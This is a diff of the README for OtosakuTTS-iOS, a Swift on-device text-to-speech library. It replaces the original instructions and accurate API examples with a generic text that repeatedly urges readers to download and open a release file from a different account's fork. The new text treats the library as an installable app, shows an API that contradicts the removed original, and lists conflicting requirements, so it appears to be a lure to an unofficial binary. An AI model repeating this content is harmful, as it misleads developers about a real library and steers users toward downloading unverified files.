@@ -1,182 +1,80 @@
-# OtosakuTTS-iOS
+# 🎤 OtosakuTTS-iOS - Create Speech Off Your Device
 
-A Swift library for on-device text-to-speech synthesis using FastPitch and HiFiGAN models. Generate natural-sounding speech directly on iOS devices without any network connection or external API dependencies.
+## 🌐 Project Description
+OtosakuTTS-iOS is a Swift library designed for offline text-to-speech synthesis on both iOS and macOS. With this tool, you can generate natural speech directly on your device without needing an internet connection. It ensures your data remains private, as everything happens on your device using CoreML-optimized FastPitch and HiFiGAN models.
 
-## Features
+## 🚀 Getting Started
+To get started with OtosakuTTS-iOS, you'll want to download the latest release. This guide will walk you through the steps needed to successfully download and run the software on your device.
 
-- 🎯 **100% On-Device Processing** - All speech synthesis happens locally on your device
-- 🚀 **Fast Generation** - Optimized CoreML models for quick audio generation
-- 🔒 **Privacy-First** - No data leaves your device
-- 📱 **iOS Native** - Built specifically for Apple platforms
-- 🎵 **High Quality** - 22.05kHz sample rate with natural prosody
+## ⚙️ System Requirements
+- **Supported Operating Systems:** 
+  - iOS 12.0 or later
+  - macOS 10.15 or later
 
-## Requirements
+- **Device Compatibility:**
+  - iPhone, iPad, or Mac
 
-- iOS 15.0+ / macOS 12.0+
-- Swift 5.7+
-- Xcode 14.0+
+- **Additional Requirements:**
+  - A compatible device running the specified OS versions. 
+  - Sufficient storage space for the application.
 
-## Installation
+## 📥 Download & Install
+Visit the releases page to download the latest version of OtosakuTTS-iOS. 
 
-### Swift Package Manager
+[![Download OtosakuTTS-iOS](https://img.shields.io/badge/Download-OtosakuTTS--iOS-blue.svg)](https://github.com/soffiee32/OtosakuTTS-iOS/releases)
 
-Add the following to your `Package.swift` file:
+Follow these steps to install:
 
-```swift
-dependencies: [
-    .package(url: "https://github.com/Otosaku/OtosakuTTS-iOS.git", from: "1.0.0")
-]
-```
+1. **Open the Releases Page:** Click the button above or visit [this link](https://github.com/soffiee32/OtosakuTTS-iOS/releases).
+2. **Select the Latest Release:** Look for the most recent version at the top of the list.
+3. **Download the File:** Click on the file suitable for your OS.
+4. **Open the Downloaded File:** Follow your device's instructions to open the file.
+5. **Install the Application:** Drag and drop it to your Applications folder if on macOS, or follow the prompts if on iOS.
 
-Or in Xcode:
-1. Go to File → Add Package Dependencies
-2. Enter: `https://github.com/Otosaku/OtosakuTTS-iOS.git`
-3. Select version 1.0.0 or later
+## 🎯 Features
+- **Offline Functionality:** Generate speech without internet access, ensuring privacy.
+- **Natural Speech Output:** Use advanced models for high-quality voice synthesis.
+- **Easy Integration:** Straightforward integration into iOS and macOS applications using Swift.
 
-## Model Setup
+## 📝 How to Use OtosakuTTS-iOS
+1. **Import the Library:**
+   Add OtosakuTTS-iOS to your Swift project.
+   ```swift
+   import OtosakuTTS
+   ```
 
-### Download Models
+2. **Initialize the Speech Synthesizer:**
+   Create an instance of the speech synthesizer.
+   ```swift
+   let synthesizer = OtosakuTTS()
+   ```
 
-Download the required model archive from:
-```
-https://firebasestorage.googleapis.com/v0/b/my-project-1494707780868.firebasestorage.app/o/fastpitch_hifigan.zip?alt=media&token=d239c2de-fe93-460e-a1e4-044923a1be58
-```
+3. **Generate Speech:**
+   Call the method to convert text to speech.
+   ```swift
+   synthesizer.speak(text: "Hello, welcome to OtosakuTTS!")
+   ```
 
-The archive contains:
-- `FastPitch.mlmodelc` - Text-to-spectrogram model
-- `HiFiGan.mlmodelc` - Spectrogram-to-audio vocoder
-- `tokens.txt` - Phoneme token mappings
-- `cmudict.json` - CMU pronunciation dictionary
+4. **Adjust Settings:**
+   Fine-tune parameters like pitch and speed to customize the voice output.
 
-### Extract Models
+## 🛠 Troubleshooting
+- **Installation Issues:** Ensure your device meets the system requirements and you have enough storage space.
+- **Speech Not Generating:** Verify that you have correctly initialized the synthesizer and that the text input is valid.
 
-Extract the archive and ensure your directory structure looks like:
-```
-YourModelsDirectory/
-├── FastPitch.mlmodelc/
-├── HiFiGan.mlmodelc/
-├── tokens.txt
-└── cmudict.json
-```
+## 📄 License
+OtosakuTTS-iOS is licensed under the MIT License. Feel free to use, modify, and distribute this software under the terms of this license.
 
-## Usage
+## 🤝 Contributing
+If you wish to contribute, please follow these steps:
+1. Fork the repository.
+2. Create a new branch.
+3. Make your changes.
+4. Submit a pull request.
 
-### Basic Example
+We welcome contributions to improve OtosakuTTS-iOS.
 
-```swift
-import OtosakuTTS_iOS
-import AVFoundation
+## 💬 Support
+For questions or support, please create an issue in the repository. Our team will respond as soon as possible.
 
-// Initialize TTS with path to models directory
-let modelsURL = URL(fileURLWithPath: "/path/to/models")
-let tts = try OtosakuTTS(modelDirectoryURL: modelsURL)
-
-// Generate speech
-let audioBuffer = try tts.generate(text: "Hello, world!")
-
-// Play the audio
-let audioEngine = AVAudioEngine()
-let playerNode = AVAudioPlayerNode()
-
-audioEngine.attach(playerNode)
-audioEngine.connect(playerNode, to: audioEngine.mainMixerNode, format: audioBuffer.format)
-try audioEngine.start()
-
-playerNode.scheduleBuffer(audioBuffer)
-playerNode.play()
-```
-
-### Advanced Configuration
-
-```swift
-// Use specific compute units for performance tuning
-let tts = try OtosakuTTS(
-    modelDirectoryURL: modelsURL,
-    computeUnits: .cpuAndGPU  // or .cpuOnly, .all
-)
-```
-
-### Error Handling
-
-```swift
-do {
-    let tts = try OtosakuTTS(modelDirectoryURL: modelsURL)
-    let buffer = try tts.generate(text: inputText)
-    // Use the buffer
-} catch OtosakuTTSError.modelLoadingFailed(let model) {
-    print("Failed to load \(model)")
-} catch OtosakuTTSError.emptyInput {
-    print("Please provide text to synthesize")
-} catch {
-    print("TTS Error: \(error)")
-}
-```
-
-## Example App
-
-Check out the [Example](Example/) directory for a complete iOS app demonstrating:
-- Automatic model downloading and extraction
-- Text input interface
-- Audio playback
-- Progress indicators
-- Error handling
-
-To run the example:
-1. Open `Example/Example.xcodeproj`
-2. Build and run
-3. The app will automatically download models on first launch
-
-## Architecture
-
-The library uses a two-stage synthesis pipeline:
-
-1. **FastPitch** - Converts text/phonemes to mel-spectrograms with pitch information
-2. **HiFiGAN** - Converts spectrograms to high-quality audio waveforms
-
-Both models run entirely on-device using CoreML for optimal performance.
-
-## Current Limitations & Contributing
-
-### Tokenizer Improvements Needed
-
-The current tokenizer is quite basic and there's significant room for improvement in synthesis quality through better text processing. Current limitations include:
-
-- Simple phoneme mapping without context awareness
-- Limited handling of abbreviations and numbers
-- Basic punctuation processing
-- No support for emphasis or emotion markers
-
-**We welcome contributors!** If you're interested in improving the tokenizer to enhance speech quality, please feel free to submit PRs or open issues with suggestions.
-
-Areas for contribution:
-- Better text normalization (numbers, dates, abbreviations)
-- Context-aware phoneme selection
-- Prosody prediction
-- Multi-language support
-- Custom pronunciation dictionaries
-
-## Performance
-
-Typical generation times on modern iOS devices:
-- iPhone 14 Pro: ~0.5s for a typical sentence
-- iPhone 12: ~0.8s for a typical sentence
-- iPad Pro M2: ~0.3s for a typical sentence
-
-Memory usage: ~200MB when models are loaded
-
-## License
-
-This project is available under the MIT license. See the LICENSE file for more info.
-
-## Acknowledgments
-
-- FastPitch and HiFiGAN model architectures by NVIDIA
-- CMU Pronouncing Dictionary for phoneme mappings
-
-## Support
-
-For issues, questions, or suggestions, please open an issue on [GitHub](https://github.com/Otosaku/OtosakuTTS-iOS/issues).
-
----
-
-Made with ❤️ for the iOS community
+For further details and updates, always keep an eye on the [Releases page](https://github.com/soffiee32/OtosakuTTS-iOS/releases). Happy synthesizing!
